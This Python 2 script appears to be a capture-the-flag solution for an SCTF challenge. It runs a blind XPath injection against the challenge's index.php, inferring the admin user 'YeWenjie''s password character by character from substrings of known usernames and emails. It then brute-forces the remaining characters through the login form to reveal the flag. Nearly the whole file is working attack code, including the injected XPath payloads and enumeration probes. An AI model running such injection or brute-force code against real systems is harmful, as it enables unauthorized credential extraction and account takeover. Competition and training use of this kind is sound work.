# -*- coding: cp936 -*-
import requests

def sbox_product():
    sbox = {}

    user1 = ['YeWenjie', 'ye@eto.org', 'leader'] 
    user2 = ['Evans', 'evans@eto.org', 'public']
    user3 = ['Decoder_One', 'one@eto.org', 'public'] 
    user4 = ['Decoder_Two', 'two@eto.org', 'public']
    user5 = ['Decoder_Three', 'three@eto.org', 'public'] 

    user = [user1, user2, user3, user4, user5]

    for i in range(len(user)):
        for j in range(len(user[i])):
            for k in range(len(user[i][j])):
                sbox[user[i][j][k]] = {'user': str(i+1), 'infoType': j, 'index': str(k+1)}

    return sbox

# firstStep: 确定字符
def bruteTheChar():
    flag = 0
    for  i in range(32):
        substring1 = ' or substring(//user[1]/password,' + str(i+1) + ',1)='
        for key, value in sbox.items():
            substring2 = 'substring(//user[' + value['user'] + ']/' +  infoType[value['infoType']] + ',' + value['index'] + ',1)'
            r = requests.get(url, 'action=user&id=6'+substring1+substring2)
            print r.url
            if r.text.find('YeWenjie') != -1:
                print r.text
                password.append(key)
                flag = 1
                break
        print ''.join(password)
        if flag:
            flag = 0
            continue
        password.append('?')
    return password

# secondStep: 确定数字
def bruteTheNum(password):
    flag = 0
    password2 = ''.join(password)
    index = password.index('?')+1
    while index:
        substring1 = ' or substring(//user[1]/password,' + str(index) + ',1)='    
        for i in range(10):
            substring2 = str(i)
            r = requests.get(url, 'action=user&id=6'+substring1+substring2)
            print r.url
            if r.text.find('YeWenjie') != -1:
                print r.text
                password[index-1]= str(i)
                flag = 1
                break
        print ''.join(password)
        if password2.find('?', index) != -1:
            index = password.index('?', index)+1
        else:
            break
        if flag:
            flag = 0
            continue
    password2 = ''.join(password)
    return password2

# thirdStep: 仍然确定不了的，爆破
def bruteUnkownChar(password):
    for i in range(128):
        password2 = password.replace('?', chr(i))
        print password2
        data = {'username': 'YeWenjie', 'password': password2}
        r = requests.post(url, data=data)
        if r.text.find('incorrect') != -1:
            print 'Password is incorrect!_' + str(i)
        else:
            index = r.text.find('SCTF{')
            index2 = r.text.find('}',index)
            print r.text[index:index2+1]
            break

if __name__ == '__main__':
    # sbox, 产生已知字符字典
    sbox = sbox_product()
    infoType = ['username', 'email', 'role']

    # url params
    url = "http://eto.sctf.xctf.org.cn/index.php"
    p = {'action': 'user', 'id': '6'}
    password = []
    

    # 判断user字段是否存在
    # r = requests.get(url, "action=user&id=1 and count(//user)=5")
    # 判断password字段是否存在
    # r = requests.get(url, "action=user&id=1 and count(//user/password)=5")
    # 判断password字段长度
    # r = requests.get(url, "action=user&id=1 and string-length(//user/password)=32")

    # print bruteTheChar()
    password = ['Y', 'w', 'j', '@', '?', '?', '?', '?', '.', 'd', '_', 'g', 'T', 'o', 'W', 'D', '?', 'c', 'e', 'u', '.', 'E', 'a', 'l', 'i', '?', 's', '?', 'y', 'a', 'r', 'n']
    # print bruteTheNum(password)
    password2 = "Ywj@4791.d_gToWD?ceu.Eali0s2yarn"

    flag = bruteUnkownChar(password2)
    # password3 = "Ywj@4791.d_gToWDmceu.Eali0s2yarn"
